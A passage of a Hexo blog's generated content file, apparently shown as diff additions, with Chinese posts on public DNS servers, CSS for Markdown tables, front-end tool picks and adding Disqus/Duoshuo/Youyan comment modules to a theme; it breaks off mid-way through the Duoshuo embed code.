+<h2 id="腾讯-Public-DNS"><a href="#腾讯-Public-DNS" class="headerlink" title="腾讯 Public DNS +"></a>腾讯 Public DNS +</h2><pre><code>119.29.29.29
+</code></pre><p><strong>官　网</strong>：<a href="https://www.dnspod.cn/Products/Public.DNS" target="_blank" rel="external">https://www.dnspod.cn/Products/Public.DNS</a><br><strong>关键词</strong>：快速，准确，稳定</p>
+<h2 id="百度公共DNS"><a href="#百度公共DNS" class="headerlink" title="百度公共DNS"></a>百度公共DNS</h2><pre><code>180.76.76.76
+</code></pre><p><strong>官　网</strong>：<a href="http://dudns.baidu.com/intro/publicdns/" target="_blank" rel="external">http://dudns.baidu.com/intro/publicdns/</a><br><strong>关键词</strong>：云防护，无劫持，更精确</p>
+<h2 id="oneDNS"><a href="#oneDNS" class="headerlink" title="oneDNS"></a>oneDNS</h2><pre><code>南方首选：112.124.47.27
+北方首选：114.215.126.16
+</code></pre><p><strong>官　网</strong>：<a href="http://www.onedns.net/" target="_blank" rel="external">http://www.onedns.net/</a><br><strong>关键词</strong>：安全，快速，恶意网站拦截，广告过滤，上网加速</p>
+<h2 id="CNNIC-SDNS"><a href="#CNNIC-SDNS" class="headerlink" title="CNNIC SDNS"></a>CNNIC SDNS</h2><pre><code>1.2.4.8
+210.2.4.8
+</code></pre><p><strong>官　网：</strong><a href="http://public.sdns.cn/" target="_blank" rel="external">http://public.sdns.cn/</a><br><strong>关键词：</strong>权威，安全，智能，高速</p>
+<h2 id="DNS-选用"><a href="#DNS-选用" class="headerlink" title="DNS 选用"></a>DNS 选用</h2><h3 id="在线查询"><a href="#在线查询" class="headerlink" title="在线查询"></a>在线查询</h3><ul>
+<li>可以通过 <a href="http://www.webkaka.com/dns/" target="_blank" rel="external">在线小工具</a> 测试一下 DNS 的解析速度，结果可以作为参考<br><img src="/resources/dns-tool.png" alt="DNS Tool"></li>
+</ul>
+<h3 id="本地优选"><a href="#本地优选" class="headerlink" title="本地优选"></a>本地优选</h3><ul>
+<li>下载 <a href="http://www.crsky.com/soft/88043.html" target="_blank" rel="external">魔方DNS助手</a>，可以方便地检测，选择和修改 DNS</li>
+</ul>
+<p><img src="/resources/dnshelper.png" alt="DNS Helper"></p>
+<blockquote>
+<p>如果更换 DNS 后网络异常，可以尝试 <a href="http://jingyan.baidu.com/article/6d704a13fb6e1828db51ca3a.html" target="_blank" rel="external">刷新本地的DNS缓存</a></p>
+</blockquote>
+]]></content>
+      
+        <categories>
+            
+            <category> 来自MOxFIVE的优秀笔记 </category>
+            
+            <category> 网络应用 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> DNS </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Markdown 表格样式调整与自适应优化]]></title>
+      <url>http://yikunhaocong.xyz/2016/03/04/markdown-table-style/</url>
+      <content type="html"><![CDATA[<p>　　Markdown 写的表格最终会被解析成 HTML 代码，如果使用的编辑器支持自定义 CSS，就能方便的调整样式。如果可以引入 JavaScript，样式自适应也能较好地实现。</p>
+<a id="more"></a>
+<p></p><p data-height="300" data-theme-id="0" data-slug-hash="ONyKqb" data-default-tab="css" data-user="MOxFIVE" class="codepen">See the Pen <a href="http://codepen.io/MOxFIVE/pen/ONyKqb/" target="_blank" rel="external">Table style</a> by MOxFIVE (<a href="http://codepen.io/MOxFIVE" target="_blank" rel="external">@MOxFIVE</a>) on <a href="http://codepen.io" target="_blank" rel="external">CodePen</a>.</p><p></p>
+<script async src="//assets.codepen.io/assets/embed/ei.js"></script>
+
+<h2 id="样式调整"><a href="#样式调整" class="headerlink" title="样式调整"></a>样式调整</h2><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><pre><code>&lt;table&gt;: 表格
+&lt;thead&gt;: table header 表头区
+&lt;th&gt;: table headings 表头单元格内容
+&lt;tbody&gt;: table body 表格内容区
+&lt;tr&gt;: table row 表行
+&lt;td&gt;: table data 单元格内容
+</code></pre><h3 id="基本样式"><a href="#基本样式" class="headerlink" title="基本样式"></a>基本样式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> &#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">100%</span>; <span class="comment">/*表格宽度*/</span></div><div class="line">    <span class="attribute">max-width</span>: <span class="number">65em</span>; <span class="comment">/*表格最大宽度，避免表格过宽*/</span></div><div class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#dedede</span>; <span class="comment">/*表格外边框设置*/</span></div><div class="line">    <span class="attribute">margin</span>: <span class="number">15px</span> auto; <span class="comment">/*外边距*/</span></div><div class="line">    <span class="attribute">border-collapse</span>: collapse; <span class="comment">/*使用单一线条的边框*/</span></div><div class="line">    <span class="attribute">empty-cells</span>: show; <span class="comment">/*单元格无内容依旧绘制边框*/</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">th</span>,</div><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">td</span> &#123;</div><div class="line">  <span class="attribute">height</span>: <span class="number">35px</span>; <span class="comment">/*统一每一行的默认高度*/</span></div><div class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#dedede</span>; <span class="comment">/*内部边框样式*/</span></div><div class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>; <span class="comment">/*内边距*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="表头样式"><a href="#表头样式" class="headerlink" title="表头样式"></a>表头样式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">th</span> &#123;</div><div class="line">    <span class="attribute">font-weight</span>: bold; <span class="comment">/*加粗*/</span></div><div class="line">    <span class="attribute">text-align</span>: center <span class="meta">!important</span>; <span class="comment">/*内容居中，加上 !important 避免被 Markdown 样式覆盖*/</span></div><div class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(158,188,226,0.2); <span class="comment">/*背景色*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="隔行变色"><a href="#隔行变色" class="headerlink" title="隔行变色"></a>隔行变色</h3><ul>
+<li>使用选择器选取复数行设置背景色。一般 Markdown 表格编译后都有 <code>&lt;tbody&gt;</code> 包裹内容，那下面就相当于从表格第二行开始计数</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">tbody</span> <span class="selector-tag">tr</span><span class="selector-pseudo">:nth-child(2n)</span> &#123;</div><div class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(158,188,226,0.12); </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="悬浮变色"><a href="#悬浮变色" class="headerlink" title="悬浮变色"></a>悬浮变色</h3><ul>
+<li>鼠标悬浮时该行改变背景色</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">tr</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">    <span class="attribute">background</span>: <span class="number">#efefef</span>; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="自适应优化"><a href="#自适应优化" class="headerlink" title="自适应优化"></a>自适应优化</h2><p>表格用 Markdown 书写，编辑器解析，因而只能在已经生成好的代码上进行自适应优化。</p>
+<h3 id="表头不换行"><a href="#表头不换行" class="headerlink" title="表头不换行"></a>表头不换行</h3><ul>
+<li>设置表头单元格内容不换行，这样可以通过表头控制该列的最小宽度，避免浏览器窗口缩小时内容被压缩得太紧</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">th</span> &#123;</div><div class="line">    <span class="attribute">white-space</span>: nowrap; <span class="comment">/*表头内容强制在一行显示*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="首列不换行"><a href="#首列不换行" class="headerlink" title="首列不换行"></a>首列不换行</h3><ul>
+<li>表格第一列单元格内容不换行，多数情况下表格首列不应该被压缩换行</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">td</span><span class="selector-pseudo">:nth-child(1)</span> &#123;</div><div class="line">    <span class="attribute">white-space</span>: nowrap; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="表格滚动条"><a href="#表格滚动条" class="headerlink" title="表格滚动条"></a>表格滚动条</h3><ul>
+<li>添加 JavaScript 代码，用一个 <code>&lt;div&gt;</code> 把表格包裹起来，父元素宽度不足时显示横向滚动条，避免表格撑破布局</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[].slice.call(<span class="built_in">document</span>.querySelectorAll(<span class="string">'table'</span>)).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">el</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> wrapper = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</div><div class="line">    wrapper.className = <span class="string">'table-area'</span>;</div><div class="line">    el.parentNode.insertBefore(wrapper, el);</div><div class="line">    el.parentNode.removeChild(el);</div><div class="line">    wrapper.appendChild(el);</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
+<ul>
+<li>jQuery</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">"table"</span>).wrap(<span class="string">"&lt;div class='table-area'&gt;&lt;/div&gt;"</span>);</div></pre></td></tr></table></figure>
+<ul>
+<li>同时添加如下 CSS</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.table-area</span> &#123;</div><div class="line">    <span class="attribute">overflow</span>: auto;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>To be added</li>
+</ul>
+]]></content>
+      
+        <categories>
+            
+            <category> 来自MOxFive的优秀笔记 </category>
+            
+            <category> 博客语言的使用 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> CSS </tag>
+            
+            <tag> Markdown </tag>
+            
+            <tag> Table </tag>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[前端工程化工具初选]]></title>
+      <url>http://yikunhaocong.xyz/2016/02/16/front-end-tools/</url>
+      <content type="html"><![CDATA[<p>　　面对日益纷杂的前端工具，作为新人常感无从下手。经过一番检索和简单对比，再结合自己的喜好，筛选了将要学习和使用的工具，以适应日益工程化、专业化的 Web 前端开发工作。</p>
+<a id="more"></a>
+<h2 id="Library-amp-Framework-库与框架"><a href="#Library-amp-Framework-库与框架" class="headerlink" title="Library &amp; Framework | 库与框架"></a>Library &amp; Framework | 库与框架</h2><blockquote>
+<ul>
+<li><a href="http://jquery.com/" target="_blank" rel="external">jQuery</a></li>
+<li><a href="http://jqueryui.com/" target="_blank" rel="external">jQuery UI</a>: A curated set of user interface interactions, effects, widgets, and themes</li>
+<li><a href="http://cn.vuejs.org/" target="_blank" rel="external">Vue.js</a>: 数据驱动的组件，为现代化的 Web 界面而生</li>
+<li><a href="http://facebook.github.io/react/" target="_blank" rel="external">React.js</a>: A JavaScript library for building user interfaces</li>
+<li><a href="https://facebook.github.io/react-native/" target="_blank" rel="external">React Native</a>: A framework for building native apps using React</li>
+</ul>
+</blockquote>
+<h2 id="The-Build-System-构建工具"><a href="#The-Build-System-构建工具" class="headerlink" title="The Build System | 构建工具"></a>The Build System | 构建工具</h2><p>The Build System is used to build, preview and test your project.</p>
+<blockquote>
+<ul>
+<li><a href="http://gulpjs.com/" target="_blank" rel="external">gulp.js</a>: Automate and enhance your workflow</li>
+</ul>
+</blockquote>
+<h2 id="The-Module-Bundler-模块打包器"><a href="#The-Module-Bundler-模块打包器" class="headerlink" title="The Module Bundler | 模块打包器"></a>The Module Bundler | 模块打包器</h2><p>Packs many modules into a few bundled assets.</p>
+<blockquote>
+<ul>
+<li><a href="https://webpack.github.io/" target="_blank" rel="external">webpack</a>: Take modules with dependencies and generate static assets representing those modules</li>
+</ul>
+</blockquote>
+<h2 id="The-Package-Manager-包管理"><a href="#The-Package-Manager-包管理" class="headerlink" title="The Package Manager | 包管理"></a>The Package Manager | 包管理</h2><p>The Package Manager is used for dependency management, so that you no longer have to manually download and manage your scripts.</p>
+<blockquote>
+<ul>
+<li><a href="https://www.npmjs.com/" target="_blank" rel="external">npm</a>: Node Package Manager.</li>
+</ul>
+</blockquote>
+<h2 id="CSS-Extension-CSS-处理"><a href="#CSS-Extension-CSS-处理" class="headerlink" title="CSS Extension | CSS 处理"></a>CSS Extension | CSS 处理</h2><p>Provide an efficient, dynamic, and expressive way to generate CSS.</p>
+<blockquote>
+<ul>
+<li><a href="https://github.com/stylus/stylus" target="_blank" rel="external">Stylus</a>: Expressive, robust, feature-rich CSS language built for nodejs</li>
+<li><a href="https://github.com/postcss/postcss" target="_blank" rel="external">PostCSS</a>: Transforming styles with JS plugins</li>
+</ul>
+</blockquote>
+<h2 id="JavaScript-Module-JavaScript-模块化"><a href="#JavaScript-Module-JavaScript-模块化" class="headerlink" title="JavaScript Module | JavaScript 模块化"></a>JavaScript Module | JavaScript 模块化</h2><blockquote>
+<ul>
+<li><a href="http://exploringjs.com/es6/ch_modules.html" target="_blank" rel="external">ECMAScript 6 Module</a></li>
+</ul>
+</blockquote>
+<h2 id="JavaScript-Template-JavaScript-模板引擎"><a href="#JavaScript-Template-JavaScript-模板引擎" class="headerlink" title="JavaScript Template | JavaScript 模板引擎"></a>JavaScript Template | JavaScript 模板引擎</h2><p>Generate HTML markup with plain JavaScript.</p>
+<blockquote>
+<ul>
+<li><a href="http://ejs.co/" target="_blank" rel="external">EJS</a></li>
+</ul>
+</blockquote>
+<h2 id="Test-Framework-测试框架"><a href="#Test-Framework-测试框架" class="headerlink" title="Test Framework | 测试框架"></a>Test Framework | 测试框架</h2><blockquote>
+<ul>
+<li><a href="http://mochajs.org/" target="_blank" rel="external">Mocha</a>: a simple, flexible, fun JavaScript test framework for node.js and the browser</li>
+<li><a href="http://chaijs.com/" target="_blank" rel="external">Chai</a>: a BDD / TDD assertion library for node and the browser that can be delightfully paired with any javascript testing framework</li>
+</ul>
+</blockquote>
+<h2 id="The-scaffolding-tool-手脚架"><a href="#The-scaffolding-tool-手脚架" class="headerlink" title="The scaffolding tool | 手脚架"></a>The scaffolding tool | 手脚架</h2><p>Scaffolds out a new application, writing your build configuration and pulling in relevant build tasks and package manager dependencies that you might need for your build.</p>
+<blockquote>
+<ul>
+<li><a href="http://yeoman.io/" target="_blank" rel="external">Yeoman</a></li>
+</ul>
+</blockquote>
+<h2 id="集成方案"><a href="#集成方案" class="headerlink" title="集成方案"></a>集成方案</h2><blockquote>
+<ul>
+<li><a href="http://fis.baidu.com/" target="_blank" rel="external">FIS</a>: 解决前端开发中自动化工具、性能优化、模块化框架、开发规范、代码部署、开发流程等问题</li>
+</ul>
+</blockquote>
+<h2 id="Container-容器"><a href="#Container-容器" class="headerlink" title="Container | 容器"></a>Container | 容器</h2><blockquote>
+<ul>
+<li><a href="http://www.docker.com/" target="_blank" rel="external">Docker</a>: Build, Ship, and Run Any App, Anywhere</li>
+</ul>
+</blockquote>
+]]></content>
+      
+        <categories>
+            
+            <category> 来自MOxFIVE的优秀笔记 </category>
+            
+            <category> 前端工具 </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[为 Hexo 主题添加评论模块 — Disqus, 多说, 友言]]></title>
+      <url>http://yikunhaocong.xyz/2016/01/02/hexo-comments/</url>
+      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>目前自己的主题 <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" rel="external">Yelee</a> 已支持使用 Disqus, 多说和友言评论，代码逻辑和配置也做了些优化，应该是比较完善了。简单分离整理一下，分享于此，方便大家添加到自己制作或使用的主题中。<p></p>
+<a id="more"></a>
+<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>参考以下文件结构把复制的代码和下载的文件放到合适的位置，必要时自行修改文件引用位置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yelee/_config.yml</div><div class="line">-----/layout/_partial/article.ejs</div><div class="line">---------------------/comments/disqus.ejs</div><div class="line">------------------------------/duoshuo.ejs</div><div class="line">------------------------------/youyan.ejs</div></pre></td></tr></table></figure>
+<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><blockquote>
+<p><a href="/resources/Hexo评论模块.zip">Hexo 评论模块（Disqus, 多说, 友言）.zip</a> by MOxFIVE</p>
+</blockquote>
+<h2 id="关联模块"><a href="#关联模块" class="headerlink" title="关联模块"></a>关联模块</h2><p>在合适位置添加以下代码，以便引入评论模块代码。代码使用我比较熟悉的 EJS 书写，使用 Swig, Jade 等其他模板的，请自行转换。</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;% <span class="keyword">if</span> (!is_home() &amp;&amp; post.comments)&#123; %&gt;</div><div class="line">    &lt;% <span class="keyword">if</span> (theme.duoshuo.on) &#123; %&gt;</div><div class="line">      &lt;%- partial(<span class="string">'comments/duoshuo'</span>, &#123;</div><div class="line">          key: post.path,</div><div class="line">          title: post.title,</div><div class="line">          url: config.url+url_for(post.path),</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (theme.youyan.on) &#123; %&gt;</div><div class="line">        &lt;%- partial(<span class="string">'comments/youyan'</span>) %&gt;</div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (theme.disqus.on) &#123; %&gt;</div><div class="line">        &lt;%- partial(<span class="string">'comments/disqus'</span>, &#123;</div><div class="line">            shortname: theme.disqus.shortname</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (config.disqus_shortname) &#123; %&gt;</div><div class="line">        &lt;%- partial(<span class="string">'comments/disqus'</span>, &#123;</div><div class="line">            shortname: config.disqus_shortname</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;% &#125; %&gt;</div><div class="line">&lt;% &#125; %&gt;</div></pre></td></tr></table></figure>
+<h3 id="代码简析"><a href="#代码简析" class="headerlink" title="代码简析"></a>代码简析</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;!--<span class="comment">//如果不是首页且没使用 `comments: false` 关闭评论，则尝试加载评论 --&gt;</span></div><div class="line">&lt;% <span class="keyword">if</span> (!is_home() &amp;&amp; post.comments)&#123; %&gt;</div><div class="line">    &lt;!--<span class="comment">//配置中启用多说时，导入相应代码 --&gt;</span></div><div class="line">    &lt;% <span class="keyword">if</span> (theme.duoshuo.on) &#123; %&gt; </div><div class="line">      &lt;!--<span class="comment">//导入duoshuo.ejs时，同时指定其中几个变量的内容。 --&gt;</span></div><div class="line">      &lt;%- partial(<span class="string">'comments/duoshuo'</span>, &#123;</div><div class="line">          key: post.path,</div><div class="line">          title: post.title,</div><div class="line">          url: config.url+url_for(post.path),</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;!--<span class="comment">//配置中仅启用友言时，导入相应代码 --&gt;</span></div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (theme.youyan.on) &#123; %&gt;</div><div class="line">        &lt;%- partial(<span class="string">'comments/youyan'</span>) %&gt;</div><div class="line">    &lt;!--<span class="comment">//配置中仅启用 Disqus 时，导入相应代码 --&gt;</span></div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (theme.disqus.on) &#123; %&gt;</div><div class="line">        &lt;%- partial(<span class="string">'comments/disqus'</span>, &#123;</div><div class="line">            shortname: theme.disqus.shortname</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;!--<span class="comment">//以上皆关闭且 Hexo 配置中设置了 disqus_shortname 时，导入相应代码 --&gt;</span></div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (config.disqus_shortname) &#123; %&gt;</div><div class="line">        &lt;!--<span class="comment">//文件分离和变量的使用，使代码能较好的兼容 Hexo 主配置 --&gt;</span></div><div class="line">        &lt;%- partial(<span class="string">'comments/disqus'</span>, &#123;</div><div class="line">            shortname: config.disqus_shortname</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;% &#125; %&gt;</div><div class="line">&lt;% &#125; %&gt;</div></pre></td></tr></table></figure>
+<h3 id="新评论系统添加"><a href="#新评论系统添加" class="headerlink" title="新评论系统添加"></a>新评论系统添加</h3><ul>
+<li>如果你想使用畅言或者其他社会化评论系统，并能灵活切换，请参考上文，新加一个 else if 判断引入服务商提供的代码，同时参考后文的配置添加新的设置项。</li>
+</ul>
+<h2 id="配置更新"><a href="#配置更新" class="headerlink" title="配置更新"></a>配置更新</h2><p>在主题中添加以下设置项进行评论功能的配置。评论设置为二级选项，因为之前不少人设置了 <code>duoshuo: true</code> ，结果都进群聊了。要启用某一个评论系统，只需去掉 on 前的 “#”，同时按照说明设置好对应个人账号信息即可。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># &gt;&gt;&gt; Conments 评论系统 &lt;&lt;&lt;</span></div><div class="line"><span class="comment"># Chose ONE as your comment system and keep others disable.</span></div><div class="line"><span class="comment"># 选一个作为网站评论系统，其他保持禁用。</span></div><div class="line"></div><div class="line"><span class="attr">disqus:</span> </div><div class="line">  <span class="comment">#on: true</span></div><div class="line"><span class="attr">  shortname:</span> </div><div class="line">  <span class="comment"># https://help.disqus.com/customer/en/portal/articles/466208-what-s-a-shortname-</span></div><div class="line">  <span class="comment"># It is unnecessary to enable disqus here if </span></div><div class="line">  <span class="comment"># you have set "disqus_shortname" in your site's "_config.yml" </span></div><div class="line"></div><div class="line"><span class="attr">duoshuo:</span> </div><div class="line">  <span class="comment">#on: true</span></div><div class="line"><span class="attr">  domain:</span> </div><div class="line">  <span class="comment"># 是否开启多说评论，http://duoshuo.com/create-site/</span></div><div class="line">  <span class="comment"># 使用上面网址登陆你的多说，然后创建站点，在 domain 中填入你设定的域名前半部分</span></div><div class="line">  <span class="comment"># http://&lt;要填的部分&gt;.duoshuo.com (domain只填上&lt;&gt;里的内容，不要填整个网址)</span></div><div class="line"></div><div class="line"><span class="attr">youyan:</span></div><div class="line">  <span class="comment">#on: true</span></div><div class="line"><span class="attr">  id:</span> </div><div class="line">  <span class="comment"># 是否开启友言评论，http://www.uyan.cc/index.php</span></div><div class="line">  <span class="comment"># id 中填写你的友言用户数字ID，注册后进入后台管理即可查看</span></div><div class="line">  <span class="comment"># 友言服务在 Web 环境下运行，普通本地环境无法查看，请部署后在线上测试。</span></div><div class="line"></div><div class="line"><span class="comment"># &gt;&gt;&gt; &lt;&lt;&lt;</span></div></pre></td></tr></table></figure>
+<h2 id="模块代码"><a href="#模块代码" class="headerlink" title="模块代码"></a>模块代码</h2><p>模块代码已附在下载文件中，在此同时列出备用。依旧是使用 EJS 编写，引入一些信息，设置了几个变量，使用其他模板引擎请自行转换。所有评论模块都设置了 <code>id=&quot;comments&quot;</code>，以便有需要时通过锚点定位跳转到评论区。</p>
+<h3 id="Disqus"><a href="#Disqus" class="headerlink" title="Disqus"></a>Disqus</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">"comments"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"disqus_thread"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="comment">/* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */</span></div><div class="line">    <span class="keyword">var</span> disqus_shortname = <span class="string">'&lt;%= shortname%&gt;'</span>; <span class="comment">// required: replace example with your forum shortname</span></div><div class="line"></div><div class="line">    <span class="comment">/* * * DON'T EDIT BELOW THIS LINE * * */</span></div><div class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">      <span class="keyword">var</span> dsq = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>); dsq.type = <span class="string">'text/javascript'</span>; dsq.async = <span class="literal">true</span>;</div><div class="line">      dsq.src = <span class="string">'//'</span> + disqus_shortname + <span class="string">'.disqus.com/embed.js'</span>;</div><div class="line">      (<span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>] || <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>]).appendChild(dsq);</div><div class="line">    &#125;)();</div><div class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">noscript</span>&gt;</span>Please enable JavaScript to view the <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://disqus.com/?ref_noscript"</span>&gt;</span>comments powered by Disqus.<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="多说评论"><a href="#多说评论" class="headerlink" title="多说评论"></a>多说评论</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"duoshuo"</span> <span class="attr">id</span>=<span class="string">"comments"</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- 多说评论框 start --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"ds-thread"</span> <span class="attr">data-thread-key</span>=<span class="string">"&lt;%= key%&gt;"</span> <span class="attr">data-title</span>=<span class="string">"&lt;%= title%&gt;"</span> <span class="attr">data-url</span>=<span class="string">"&lt;%= url%&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- 多说评论框 end --&gt;</span></div><div class="line">    <span class="comment">&lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span 